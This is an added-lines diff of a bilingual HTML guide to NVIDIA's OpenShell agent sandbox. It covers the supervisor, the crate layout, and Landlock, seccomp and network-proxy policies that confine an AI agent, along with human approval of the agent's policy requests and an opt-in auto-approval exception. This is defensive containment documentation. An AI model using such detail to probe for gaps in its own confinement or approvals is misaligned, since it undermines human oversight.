+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="1 · Sandbox lifecycle" data-zh="1 · Sandbox 生命週期">1 · Sandbox lifecycle</h4><p style="margin:0" data-en="Create, get, list, delete and watch sandboxes across all compute backends, through the ComputeDriver contract (Section 8)." data-zh="透過 ComputeDriver 合約（第 8 節）在所有 compute backend 上建立、查詢、列出、刪除與監看 sandbox。">Create, get, list, delete and watch sandboxes across all compute backends, through the ComputeDriver contract (Section 8).</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="2 · Credential management" data-zh="2 · 憑證管理">2 · Credential management</h4><p style="margin:0" data-en="Stores provider credentials gateway-side only; materialises them at sandbox creation and rotates them via OAuth2 / Google SA JWT strategies (Sections 8–9)." data-zh="憑證只存於 Gateway 側；在 sandbox 建立時 materialise，並以 OAuth2 / Google SA JWT 策略輪換（第 8–9 節）。">Stores provider credentials gateway-side only; materialises them at sandbox creation and rotates them via OAuth2 / Google SA JWT strategies (Sections 8–9).</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="3 · Policy management" data-zh="3 · 政策管理">3 · Policy management</h4><p style="margin:0" data-en="Stores, composes (base + provider layers + drafts) and distributes policies to supervisors; network policy hot-reloads into running sandboxes." data-zh="儲存、組合（base + provider layers + drafts）並分發政策給 supervisor；網路政策可 hot-reload 到執行中的 sandbox。">Stores, composes (base + provider layers + drafts) and distributes policies to supervisors; network policy hot-reloads into running sandboxes.</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="4 · Authentication" data-zh="4 · 認證">4 · Authentication</h4><p style="margin:0" data-en="OIDC, Kubernetes ServiceAccount, Cloudflare JWT, gateway-minted sandbox JWT, plus mTLS and SPIFFE workload identity (Section 9)." data-zh="OIDC、Kubernetes ServiceAccount、Cloudflare JWT、Gateway 簽發的 sandbox JWT，另加 mTLS 與 SPIFFE workload identity（第 9 節）。">OIDC, Kubernetes ServiceAccount, Cloudflare JWT, gateway-minted sandbox JWT, plus mTLS and SPIFFE workload identity (Section 9).</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="5 · Supervisor sessions" data-zh="5 · Supervisor session 管理">5 · Supervisor sessions</h4><p style="margin:0" data-en="Maintains the bidirectional ConnectSupervisor stream per sandbox; if the supervisor disconnects, the agent is frozen and only the same supervisor process can reconnect and resume it." data-zh="為每個 sandbox 維持雙向 ConnectSupervisor stream；supervisor 斷線時 agent 會被凍結（freeze），只有同一個 supervisor 程序能重連恢復。">Maintains the bidirectional <code>ConnectSupervisor</code> stream per sandbox; if the supervisor disconnects, the agent is frozen and only the same supervisor process can reconnect and resume it.</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="6 · SSH sessions" data-zh="6 · SSH session 管理">6 · SSH sessions</h4><p style="margin:0" data-en="Issues and revokes SSH sessions; SSH, exec and TCP traffic all relay over the single outbound supervisor stream — there is no inbound path to relay through." data-zh="簽發與撤銷 SSH session；SSH、exec 與 TCP 流量全部經同一條 outbound supervisor stream 中繼——不存在可被利用的 inbound 路徑。">Issues and revokes SSH sessions; SSH, exec and TCP traffic all relay over the single outbound supervisor stream — there is no inbound path to relay through.</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="7 · Service exposure" data-zh="7 · 服務對外暴露">7 · Service exposure</h4><p style="margin:0" data-en="Exposes selected sandbox services externally (ExposeService / GetService / ListServices / DeleteService), under Gateway control rather than sandbox self-publication." data-zh="在 Gateway 控制下將選定的 sandbox 服務對外暴露（ExposeService / GetService / ListServices / DeleteService），而非由 sandbox 自行發布。">Exposes selected sandbox services externally (<code>ExposeService</code> / <code>GetService</code> / <code>ListServices</code> / <code>DeleteService</code>), under Gateway control rather than sandbox self-publication.</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0" data-en="8 · Draft policy learning" data-zh="8 · Draft 政策學習">8 · Draft policy learning</h4><p style="margin:0" data-en="Accepts policy analysis from supervisors, builds draft recommendations from aggregated denials, and presents them for operator approve / reject / edit / undo (Section 6)." data-zh="接收 supervisor 的 policy analysis，將彙總的拒絕事件建成 draft 建議，交由操作者 approve / reject / edit / undo（第 6 節）。">Accepts policy analysis from supervisors, builds draft recommendations from aggregated denials, and presents them for operator approve / reject / edit / undo (Section 6).</p></div>
+      </div>
+
+      <div class="note warn">
+        <div class="note-t" data-en="“The agent cannot approve its own policy change” — with one opt-in exception" data-zh="「Agent 不能批准自己的政策變更」——有一個 opt-in 例外">“The agent cannot approve its own policy change” — with one opt-in exception <span class="tag official">NVIDIA official</span></div>
+        <p style="margin:0" data-en="By default, draft proposals stay pending human review and the agent cannot approve its own request. NVIDIA's docs also describe an opt-in auto-approval mode: a proposal may be auto-approved only when the prover delta is empty and there are no security notes. State the guarantee precisely — “manual by default; auto mode remains gated by prover + security notes” — not as an unconditional promise." data-zh="預設情況下，draft 提案會停留在 pending human review，agent 不能批准自己的請求。但 NVIDIA 文件同時記載了 opt-in 自動批准模式：僅當 prover delta 為空且無 security notes 時，提案才可自動批准。正確的表述是「預設手動；自動模式仍受 prover＋security notes 閘門約束」，而非無條件保證。">By default, draft proposals stay pending human review and the agent cannot approve its own request. NVIDIA's docs also describe an <strong>opt-in auto-approval mode</strong>: a proposal may be auto-approved only when the prover delta is empty and there are no security notes. State the guarantee precisely — “manual by default; auto mode remains gated by prover + security notes” — not as an unconditional promise.</p>
+      </div>
+    </section>
+
+    <!-- ============ 3 · SUPERVISOR ============ -->
+    <section class="chapter" id="s3">
+      <div class="ch-head"><span class="ch-num">03</span><h2 data-en="Supervisor deep dive" data-zh="Supervisor 深掘">Supervisor deep dive</h2><span class="tag d0003">D0003 · openshell-sandbox</span></div>
+      <p class="ch-sub" data-en="The enforcement engine inside the sandbox. It runs as PID 1 (init), spawns the agent as a child process, and makes every policy decision the agent cannot override. The sandbox itself makes no policy decisions of its own — enforcement semantics live here and in the Gateway." data-zh="位於 sandbox 內的強制執行引擎。它以 PID 1（init）執行，將 agent 作為 child 程序啟動，並做出 agent 無法覆寫的每一項政策決策。Sandbox 本身不做政策決策——執行語義在此處與 Gateway。">The enforcement engine inside the sandbox. It runs as PID 1 (init), spawns the agent as a child process, and makes every policy decision the agent cannot override. The sandbox itself makes no policy decisions of its own — enforcement semantics live here and in the Gateway.</p>
+
+      <h3 class="sub" data-en="Startup flow" data-zh="啟動流程">Startup flow</h3>
+      <pre><span class="cm"># openshell-sandbox main()</span>
+├─ Parse CLI args <span class="cm">(sandbox_id, endpoint, policy, mode, timeout)</span>
+├─ Initialize logging
+│    ├─ Rolling file appender: /var/log/openshell*.log <span class="cm">(daily, 3 files)</span>
+│    ├─ OCSF JSONL layer: /var/log/openshell-ocsf*.log <span class="cm">(if enabled)</span>
+│    └─ Shorthand + JSONL formatters
+├─ Set OCSF context <span class="cm">(sandbox_id, name, image, hostname, version)</span>
+├─ Load policy <span class="cm">— from file (--policy-data), from Gateway, or restrictive default</span>
+├─ Fetch provider environment <span class="cm">(credentials from Gateway)</span>
+├─ Set up denial aggregator <span class="cm">(for policy learning)</span>
+├─ Start supervisors
+│    ├─ Process Supervisor <span class="cm">(Landlock + seccomp + cap_drop)</span>
+│    └─ Network Supervisor <span class="cm">(netns + nftables + OPA proxy)</span>
+├─ Start log-push task <span class="cm">(stream logs to Gateway)</span>
+├─ Connect to Gateway <span class="cm">(ConnectSupervisor stream)</span>
+└─ Spawn agent process as child</pre>
+
+      <h3 class="sub" data-en="Module structure" data-zh="模組結構">Module structure</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th>Module</th><th data-en="Purpose" data-zh="用途">Purpose</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>sandbox</code></td><td data-en="Sandbox initialization (Landlock, seccomp application)" data-zh="Sandbox 初始化（套用 Landlock、seccomp）">Sandbox initialization (Landlock, seccomp application)</td></tr>
+          <tr><td class="c"><code>run</code></td><td data-en="Supervisor main run loop" data-zh="Supervisor 主執行迴圈">Supervisor main run loop</td></tr>
+          <tr><td class="c"><code>process</code></td><td data-en="Process spawn and lifecycle management" data-zh="程序啟動與生命週期管理">Process spawn and lifecycle management</td></tr>
+          <tr><td class="c"><code>managed_children</code></td><td data-en="Child process tracking and reaping" data-zh="Child 程序追蹤與回收">Child process tracking and reaping</td></tr>
+          <tr><td class="c"><code>child_env</code></td><td data-en="Environment variable construction for the child (where provider env reaches the agent)" data-zh="為 child 建構環境變數（provider env 抵達 agent 的路徑）">Environment variable construction for the child (where provider env reaches the agent)</td></tr>
+          <tr><td class="c"><code>supervisor_session</code></td><td data-en="Gateway session management (bidirectional stream)" data-zh="Gateway session 管理（雙向 stream）">Gateway session management (bidirectional stream)</td></tr>
+          <tr><td class="c"><code>ssh</code></td><td data-en="SSH server and tunnel relay" data-zh="SSH server 與 tunnel 中繼">SSH server and tunnel relay</td></tr>
+          <tr><td class="c"><code>skills</code></td><td data-en="Agent skill installation at startup" data-zh="啟動時安裝 agent skill">Agent skill installation at startup</td></tr>
+          <tr><td class="c"><code>log_push</code></td><td data-en="Non-blocking log streaming to Gateway" data-zh="非阻塞式日誌串流至 Gateway">Non-blocking log streaming to Gateway</td></tr>
+          <tr><td class="c"><code>netns</code></td><td data-en="Network namespace setup and nftables rules" data-zh="Network namespace 設定與 nftables 規則">Network namespace setup and nftables rules</td></tr>
+          <tr><td class="c"><code>bypass_monitor</code></td><td data-en="L7 enforcement bypass detection (Linux-specific)" data-zh="L7 強制執行繞過偵測（Linux 專屬）">L7 enforcement bypass detection (Linux-specific)</td></tr>
+          <tr><td class="c"><code>debug_rpc</code></td><td data-en="One-shot gRPC debug calls" data-zh="一次性 gRPC debug 呼叫">One-shot gRPC debug calls</td></tr>
+        </tbody>
+      </table></div>
+
+      <h3 class="sub" data-en="Operating modes" data-zh="運作模式">Operating modes</h3>
+      <div class="grid3">
+        <div class="card"><h4 class="sub" style="margin-top:0">Mode::Both <span class="badge-dyn" data-en="default" data-zh="預設">default</span></h4><p style="margin:0" data-en="A single binary enforces process + network policies together — the standard topology." data-zh="單一 binary 同時執行 process 與 network 政策——標準拓撲。">A single binary enforces process + network policies together — the standard topology.</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0">Mode::Network-only</h4><p style="margin:0" data-en="Runs only the network namespace + OPA proxy (split topology)." data-zh="僅執行 network namespace + OPA proxy（拆分拓撲）。">Runs only the network namespace + OPA proxy (split topology).</p></div>
+        <div class="card"><h4 class="sub" style="margin-top:0">Mode::Process-only</h4><p style="margin:0" data-en="Runs only Landlock + seccomp (split topology)." data-zh="僅執行 Landlock + seccomp（拆分拓撲）。">Runs only Landlock + seccomp (split topology).</p></div>
+      </div>
+      <p data-en="Two companion binaries complete the operator surface: openshell-cli, the user-facing CLI that talks to the Gateway over gRPC, and openshell-tui, a Ratatui-based terminal UI for interactive sandbox management and monitoring." data-zh="另外兩個 binary 補齊操作者介面：openshell-cli 是經 gRPC 與 Gateway 通訊的 CLI；openshell-tui 是以 Ratatui 建構的終端 UI，用於互動式 sandbox 管理與監控。">Two companion binaries complete the operator surface: <code>openshell-cli</code>, the user-facing CLI that talks to the Gateway over gRPC, and <code>openshell-tui</code>, a Ratatui-based terminal UI for interactive sandbox management and monitoring.</p>
+    </section>
+
+    <!-- ============ 4 · WORKSPACE ============ -->
+    <section class="chapter" id="s4">
+      <div class="ch-head"><span class="ch-num">04</span><h2 data-en="Workspace: 19 crates, one responsibility each" data-zh="Workspace：19 個 crate，各司其職">Workspace: 19 crates, one responsibility each</h2><span class="tag d0003">D0003</span></div>
+      <p class="ch-sub" data-en="OpenShell is a Rust workspace. The split is architectural, not cosmetic: binaries at the edges, enforcement libraries in the middle, one driver crate per compute backend, and a macro crate for the server. Use the search box above — it filters this table, the policy-field table and the RPC table live." data-zh="OpenShell 是一個 Rust workspace。這種切分是架構性的、不是裝飾：binary 在邊緣、強制執行 library 在中間、每個 compute backend 一個 driver crate、server 另有 macro crate。使用上方搜尋框——它會即時過濾此表、政策欄位表與 RPC 表。">OpenShell is a Rust workspace. The split is architectural, not cosmetic: binaries at the edges, enforcement libraries in the middle, one driver crate per compute backend, and a macro crate for the server. Use the search box above — it filters this table, the policy-field table and the RPC table live.</p>
+      <div class="tblwrap"><table class="filterable">
+        <thead><tr><th>Crate</th><th data-en="Role" data-zh="角色">Role</th><th data-en="Category" data-zh="類別">Category</th></tr></thead>
+        <tbody>
+          <tr><td class="c"><code>openshell-server</code></td><td data-en="Gateway binary (control plane)" data-zh="Gateway binary（control plane）">Gateway binary (control plane)</td><td class="c">Binary</td></tr>
+          <tr><td class="c"><code>openshell-sandbox</code></td><td data-en="Supervisor binary (data plane)" data-zh="Supervisor binary（data plane）">Supervisor binary (data plane)</td><td class="c">Binary</td></tr>
+          <tr><td class="c"><code>openshell-cli</code></td><td data-en="User-facing CLI" data-zh="使用者 CLI">User-facing CLI</td><td class="c">Binary</td></tr>
+          <tr><td class="c"><code>openshell-tui</code></td><td data-en="Ratatui-based terminal UI" data-zh="Ratatui 終端 UI">Ratatui-based terminal UI</td><td class="c">Binary</td></tr>
+          <tr><td class="c"><code>openshell-core</code></td><td data-en="Shared types, config, error handling" data-zh="共用型別、組態、錯誤處理">Shared types, config, error handling</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-policy</code></td><td data-en="Policy engine (YAML↔proto, validation, merge, composition)" data-zh="政策引擎（YAML↔proto、驗證、合併、組合）">Policy engine (YAML↔proto, validation, merge, composition)</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-router</code></td><td data-en="Privacy-aware LLM inference routing" data-zh="具隱私意識的 LLM inference routing">Privacy-aware LLM inference routing</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-providers</code></td><td data-en="Credential provider backends" data-zh="憑證 provider 後端">Credential provider backends</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-bootstrap</code></td><td data-en="Gateway metadata &amp; auth token storage" data-zh="Gateway metadata 與 auth token 儲存">Gateway metadata &amp; auth token storage</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-ocsf</code></td><td data-en="OCSF v1.7.0 event types and tracing layers" data-zh="OCSF v1.7.0 事件型別與 tracing layer">OCSF v1.7.0 event types and tracing layers</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-prover</code></td><td data-en="Z3 SMT formal policy verification" data-zh="Z3 SMT 形式化政策驗證">Z3 SMT formal policy verification</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-supervisor-process</code></td><td data-en="Process-domain enforcement (Landlock, seccomp)" data-zh="Process 域強制執行（Landlock、seccomp）">Process-domain enforcement (Landlock, seccomp)</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-supervisor-network</code></td><td data-en="Network-domain enforcement (netns, nftables, OPA proxy)" data-zh="Network 域強制執行（netns、nftables、OPA proxy）">Network-domain enforcement (netns, nftables, OPA proxy)</td><td class="c">Library</td></tr>
+          <tr><td class="c"><code>openshell-driver-docker</code></td><td data-en="Docker compute driver" data-zh="Docker compute driver">Docker compute driver</td><td class="c">Driver</td></tr>
+          <tr><td class="c"><code>openshell-driver-podman</code></td><td data-en="Podman compute driver" data-zh="Podman compute driver">Podman compute driver</td><td class="c">Driver</td></tr>
+          <tr><td class="c"><code>openshell-driver-kubernetes</code></td><td data-en="Kubernetes compute driver" data-zh="Kubernetes compute driver">Kubernetes compute driver</td><td class="c">Driver</td></tr>
+          <tr><td class="c"><code>openshell-driver-vm</code></td><td data-en="MicroVM compute driver (libkrun)" data-zh="MicroVM compute driver（libkrun）">MicroVM compute driver (libkrun)</td><td class="c">Driver</td></tr>
+          <tr><td class="c"><code>openshell-vfio</code></td><td data-en="VFIO GPU passthrough support" data-zh="VFIO GPU passthrough 支援">VFIO GPU passthrough support</td><td class="c">Driver</td></tr>
+          <tr><td class="c"><code>openshell-server-macros</code></td><td data-en="Procedural macros for server" data-zh="Server 的 procedural macro">Procedural macros for server</td><td class="c">Macro</td></tr>
+        </tbody>
+      </table></div>
+      <p class="noresult" data-en="No crate matches your search." data-zh="沒有 crate 符合搜尋。">No crate matches your search.</p>
+    </section>
+
+    <!-- ============ 5 · POLICY DOMAINS ============ -->
+    <section class="chapter" id="s5">
+      <div class="ch-head"><span class="ch-num">05</span><h2 data-en="The four policy domains" data-zh="四個政策域">The four policy domains</h2><span class="tag d0003">D0003</span><span class="tag official">NVIDIA official</span></div>
+      <p class="ch-sub" data-en="Four independent domains form a defense-in-depth stack. The lower two are kernel-level and locked at creation; the upper two are proxy-level and hot-reloadable. Policies are authored in YAML and compiled to OPA/Rego, evaluated for each outbound request." data-zh="四個獨立的政策域組成 defense-in-depth 堆疊。下方兩層是核心層、在建立時鎖定；上方兩層是 proxy 層、可 hot-reload。政策以 YAML 撰寫、編譯為 OPA/Rego，對每個 outbound request 進行評估。">Four independent domains form a defense-in-depth stack. The lower two are kernel-level and locked at creation; the upper two are proxy-level and hot-reloadable. Policies are authored in YAML and compiled to OPA/Rego, evaluated for each outbound request.</p>
+
+      <div class="tabs" role="tablist" aria-label="Policy domains">
+        <button role="tab" aria-selected="true" data-tab="fs">1 · Filesystem — Landlock</button>
+        <button role="tab" aria-selected="false" data-tab="proc">2 · Process — seccomp</button>
+        <button role="tab" aria-selected="false" data-tab="net">3 · Network — OPA L7</button>
+        <button role="tab" aria-selected="false" data-tab="inf">4 · Inference — inference.local</button>
+      </div>
+
+      <div class="tabpanel" data-panel="fs">
+        <h3 class="sub" style="margin-top:0">Filesystem <span class="badge-static">STATIC · locked at creation</span></h3>
+        <p data-en="Mechanism: the Linux Landlock security module (LSM), applied via syscall 444 (landlock_create_ruleset), implemented in openshell-supervisor-process/src/sandbox/linux/landlock.rs. ABI detection probes the syscall with a version-check flag and lands in one of five availability states: Available, NotImplemented (ENOSYS), NotEnabled (EOPNOTSUPP), Blocked (EPERM), Unknown." data-zh="機制：Linux Landlock security module（LSM），經 syscall 444（landlock_create_ruleset）套用，實作於 openshell-supervisor-process/src/sandbox/linux/landlock.rs。ABI 偵測以 version-check flag 探測該 syscall，結果落在五種可用狀態之一：Available、NotImplemented（ENOSYS）、NotEnabled（EOPNOTSUPP）、Blocked（EPERM）、Unknown。">Mechanism: the Linux Landlock security module (LSM), applied via syscall 444 (<code>landlock_create_ruleset</code>), implemented in <code>openshell-supervisor-process/src/sandbox/linux/landlock.rs</code>. ABI detection probes the syscall with a version-check flag and lands in one of five availability states: <code>Available</code>, <code>NotImplemented</code> (ENOSYS), <code>NotEnabled</code> (EOPNOTSUPP), <code>Blocked</code> (EPERM), <code>Unknown</code>.</p>
+        <pre><span class="cm"># SandboxPolicy.filesystem + SandboxPolicy.landlock</span>
+filesystem:
+  include_workdir: <span class="kw">true</span>       <span class="cm"># auto-include CWD as read-write</span>
+  read_only:
+    - /usr
+    - /lib
+    - /proc
+    - /dev/urandom
+    - /app
+    - /etc
+    - /var/log
+  read_write:
+    - /sandbox
+    - /tmp
+    - /dev/null
+
+landlock:
+  compatibility: best_effort  <span class="cm"># or "hard_requirement"</span></pre>
+        <div class="grid2">
+          <div class="card"><h4 class="sub" style="margin-top:0">best_effort</h4><p style="margin:0" data-en="Apply what the kernel supports; degrade gracefully on older kernels." data-zh="套用核心支援的部分；在舊核心上優雅降級。">Apply what the kernel supports; degrade gracefully on older kernels.</p></div>
+          <div class="card"><h4 class="sub" style="margin-top:0">hard_requirement</h4><p style="margin:0" data-en="Fail sandbox creation outright if Landlock is unavailable." data-zh="若 Landlock 不可用，直接讓 sandbox 建立失敗。">Fail sandbox creation outright if Landlock is unavailable.</p></div>
+        </div>
+        <p><strong data-en="What it prevents:" data-zh="它防堵什麼：">What it prevents:</strong> <span data-en="file reads/writes outside the allowlisted paths — an agent cannot read /etc/shadow, write to /usr/bin, or reach arbitrary host directories." data-zh="allowlist 路徑之外的檔案讀寫——agent 無法讀取 /etc/shadow、寫入 /usr/bin，或存取任意 host 目錄。">file reads/writes outside the allowlisted paths — an agent cannot read <code>/etc/shadow</code>, write to <code>/usr/bin</code>, or reach arbitrary host directories.</span></p>
+        <div class="note warn"><div class="note-t" data-en="Version note from verified docs" data-zh="查證文件的版本註記">Version note from verified docs <span class="tag docs" data-en="Docs verified" data-zh="文件實查">Docs verified</span></div>
+        <p style="margin:0" data-en="Newer docs (v0.1.2 / v0.1.3 support matrix) mark Landlock as Required, ABI 3+ (Linux 6.2+), with the baseline not disableable via best_effort. Older kernels (e.g. RHEL 9.x / RHCOS on kernel &lt; 5.19) may fall into a reduced legacy read-only mode, and if Landlock is disabled or seccomp operations are blocked, the sandbox fails closed. D0003's best_effort / hard_requirement modes and the newer Required stance describe different doc versions — pin your version before relying on either." data-zh="較新文件（v0.1.2 / v0.1.3 support matrix）將 Landlock 標為 Required、ABI 3+（Linux 6.2+），且 baseline 不可被 best_effort 關閉。舊核心（如 RHEL 9.x / RHCOS、kernel &lt; 5.19）可能落入 reduced legacy read-only 模式；若 Landlock 被停用或 seccomp 操作被阻擋，sandbox 會 fail closed。D0003 的 best_effort / hard_requirement 模式與較新的 Required 立場出自不同文件版本——引用任一說法前先鎖定版本。">Newer docs (v0.1.2 / v0.1.3 support matrix) mark Landlock as <strong>Required, ABI 3+ (Linux 6.2+)</strong>, with the baseline not disableable via <code>best_effort</code>. Older kernels (e.g. RHEL 9.x / RHCOS on kernel &lt; 5.19) may fall into a reduced legacy read-only mode, and if Landlock is disabled or seccomp operations are blocked, the sandbox <strong>fails closed</strong>. D0003's modes and the newer Required stance describe different doc versions — pin your version before relying on either.</p></div>
+      </div>
+
+      <div class="tabpanel" data-panel="proc" hidden>
+        <h3 class="sub" style="margin-top:0">Process <span class="badge-static">STATIC · locked at creation</span></h3>
+        <p data-en="Mechanism: seccomp BPF syscall filtering plus Linux capability dropping. Policy validation rejects any process identity other than sandbox:sandbox (InvalidProcessIdentity)." data-zh="機制：seccomp BPF syscall 過濾，加上 Linux capability 削減。政策驗證會拒絕 sandbox:sandbox 以外的任何 process 身分（InvalidProcessIdentity）。">Mechanism: seccomp BPF syscall filtering plus Linux capability dropping. Policy validation rejects any process identity other than <code>sandbox:sandbox</code> (<code>InvalidProcessIdentity</code>).</p>
+        <pre><span class="cm"># SandboxPolicy.process</span>
+process:
+  run_as_user: sandbox
+  run_as_group: sandbox</pre>
+        <ul>
+          <li data-en="The agent runs as sandbox:sandbox — never root." data-zh="Agent 以 sandbox:sandbox 執行——永不以 root 執行。">The agent runs as <code>sandbox:sandbox</code> — never root.</li>
+          <li data-en="Dangerous capabilities are dropped (no CAP_NET_ADMIN, no CAP_SYS_ADMIN, …)." data-zh="危險 capability 一律丟棄（無 CAP_NET_ADMIN、無 CAP_SYS_ADMIN……）。">Dangerous capabilities are dropped (no <code>CAP_NET_ADMIN</code>, no <code>CAP_SYS_ADMIN</code>, …).</li>
+          <li data-en="seccomp BPF blocks dangerous syscalls such as ptrace, mount and reboot." data-zh="seccomp BPF 阻擋 ptrace、mount、reboot 等危險 syscall。">seccomp BPF blocks dangerous syscalls such as <code>ptrace</code>, <code>mount</code> and <code>reboot</code>.</li>
+        </ul>
+        <p><strong data-en="What it prevents:" data-zh="它防堵什麼：">What it prevents:</strong> <span data-en="privilege escalation, container escape via mount-namespace manipulation, and ptrace-based attacks against the supervisor itself." data-zh="權限提升、經 mount namespace 操作的容器逃逸，以及對 supervisor 本身的 ptrace 攻擊。">privilege escalation, container escape via mount-namespace manipulation, and ptrace-based attacks against the supervisor itself.</span></p>
+      </div>
+
+      <div class="tabpanel" data-panel="net" hidden>
+        <h3 class="sub" style="margin-top:0">Network <span class="badge-dyn">DYNAMIC · hot-reloadable</span></h3>
+        <p data-en="Mechanism: a three-layer stack. The agent sits in a network namespace where nftables REDIRECT rules force all outbound traffic — DNS included — into the OPA L7 proxy. There is no direct egress path. The proxy terminates or passes through TLS, inspects method / path / query / body, enforces GraphQL operation-level control, and rewrites or injects credentials only for approved endpoints." data-zh="機制：三層堆疊。Agent 位於 network namespace 中，nftables REDIRECT 規則強制所有 outbound 流量（含 DNS）進入 OPA L7 proxy，不存在直接 egress 路徑。Proxy 依設定 terminate 或 passthrough TLS，檢查 method / path / query / body，執行 GraphQL operation 層級控制，並且只對已批准端點重寫或注入憑證。">Mechanism: a three-layer stack. The agent sits in a network namespace where nftables REDIRECT rules force all outbound traffic — DNS included — into the OPA L7 proxy. There is no direct egress path. The proxy terminates or passes through TLS, inspects method / path / query / body, enforces GraphQL operation-level control, and rewrites or injects credentials only for approved endpoints.</p>
+        <pre><span class="cm"># SandboxPolicy.network_policies</span>
+network_policies:
+  github:
+    name: github
+    endpoints:
+      - host: <span class="kw">"api.github.com"</span>
+        ports: [443]
+        protocol: rest
+        tls: terminate
+        enforcement: enforce
+        access: read-write
+        rules:
+          - method: GET
+            path: <span class="kw">"/repos/*"</span>
+          - method: POST
+            path: <span class="kw">"/repos/*/issues"</span>
+        deny_rules:
+          - method: DELETE
+            path: <span class="kw">"/repos/*"</span>
+    binaries:
+      - path: /usr/bin/curl
+      - path: /usr/bin/git</pre>
+        <h4 class="sub">NetworkEndpoint <span data-en="fields" data-zh="欄位">fields</span></h4>
+        <div class="tblwrap"><table class="filterable">
+          <thead><tr><th>Field</th><th data-en="Purpose" data-zh="用途">Purpose</th></tr></thead>
+          <tbody>
+            <tr><td class="c"><code>host</code></td><td data-en="Hostname or glob (*.example.com). TLD wildcards like *.com are rejected." data-zh="Hostname 或 glob（*.example.com）。*.com 這類 TLD wildcard 會被拒絕。">Hostname or glob (<code>*.example.com</code>). TLD wildcards like <code>*.com</code> are <strong>rejected</strong>.</td></tr>
+            <tr><td class="c"><code>ports</code></td><td data-en="Allowed ports (multiple supported)" data-zh="允許的 port（可多個）">Allowed ports (multiple supported)</td></tr>
+            <tr><td class="c"><code>protocol</code></td><td class="c">rest · websocket · graphql · sql · (empty)</td></tr>
+            <tr><td class="c"><code>tls</code></td><td data-en="terminate (proxy decrypts and inspects) or passthrough" data-zh="terminate（proxy 解密並檢查）或 passthrough">terminate (proxy decrypts and inspects) or passthrough</td></tr>
+            <tr><td class="c"><code>enforcement</code></td><td data-en="enforce (block violations) or audit (log only)" data-zh="enforce（阻擋違規）或 audit（僅記錄）">enforce (block violations) or audit (log only)</td></tr>
+            <tr><td class="c"><code>access</code></td><td class="c">read-only · read-write · full</td></tr>
+            <tr><td class="c"><code>rules</code></td><td data-en="Explicit L7 allow rules (method, path, query, body patterns)" data-zh="明確的 L7 allow 規則（method、path、query、body 模式）">Explicit L7 allow rules (method, path, query, body patterns)</td></tr>
+            <tr><td class="c"><code>deny_rules</code></td><td data-en="Explicit L7 deny rules — evaluated after allow rules and take precedence" data-zh="明確的 L7 deny 規則——在 allow 之後評估且優先">Explicit L7 deny rules — evaluated after allow rules and take precedence</td></tr>
+            <tr><td class="c"><code>allowed_ips</code></td><td data-en="CIDR / IP allowlist" data-zh="CIDR / IP allowlist">CIDR / IP allowlist</td></tr>
+            <tr><td class="c"><code>websocket_credential_rewrite</code></td><td data-en="Rewrite credentials inside WebSocket frames" data-zh="重寫 WebSocket frame 內的憑證">Rewrite credentials inside WebSocket frames</td></tr>
+            <tr><td class="c"><code>request_body_credential_rewrite</code></td><td data-en="Rewrite credentials inside HTTP request bodies" data-zh="重寫 HTTP request body 內的憑證">Rewrite credentials inside HTTP request bodies</td></tr>
+            <tr><td class="c"><code>persisted_queries</code></td><td data-en="GraphQL mode: deny, or allow_registered" data-zh="GraphQL 模式：deny，或 allow_registered">GraphQL mode: <code>deny</code>, or <code>allow_registered</code></td></tr>
+            <tr><td class="c"><code>graphql_persisted_queries</code></td><td data-en="Map of trusted GraphQL operations" data-zh="受信任 GraphQL operation 的對照表">Map of trusted GraphQL operations</td></tr>
+            <tr><td class="c"><code>graphql_max_body_bytes</code></td><td data-en="Max request body buffer (default 65536)" data-zh="Request body buffer 上限（預設 65536）">Max request body buffer (default 65536)</td></tr>
+          </tbody>
+        </table></div>
+        <p class="noresult" data-en="No endpoint field matches your search." data-zh="沒有 endpoint 欄位符合搜尋。">No endpoint field matches your search.</p>
+        <p><strong data-en="Restrictive default:" data-zh="限制性預設：">Restrictive default:</strong> <span data-en="an empty network_policies blocks all network access. What it prevents: unauthorized API calls, DNS-tunneling exfiltration, SSRF, access to link-local metadata services (169.254.x.x), and credential leakage to unapproved endpoints. The supervisor can also inspect HTTP, GraphQL and MCP traffic per the official blog." data-zh="空的 network_policies 代表阻擋所有網路存取。它防堵：未授權 API 呼叫、DNS tunneling 外洩、SSRF、對 link-local metadata 服務（169.254.x.x）的存取，以及憑證洩漏到未批准端點。依官方部落格，supervisor 亦可檢查 HTTP、GraphQL 與 MCP 流量。">an empty <code>network_policies</code> blocks <strong>all</strong> network access. <strong>What it prevents:</strong> unauthorized API calls, DNS-tunneling exfiltration, SSRF, access to link-local metadata services (169.254.x.x), and credential leakage to unapproved endpoints. The supervisor can also inspect HTTP, GraphQL and MCP traffic per the official blog.</span></p>
+      </div>
+
+      <div class="tabpanel" data-panel="inf" hidden>
+        <h3 class="sub" style="margin-top:0">Inference routing <span class="badge-dyn">DYNAMIC · hot-reloadable</span></h3>
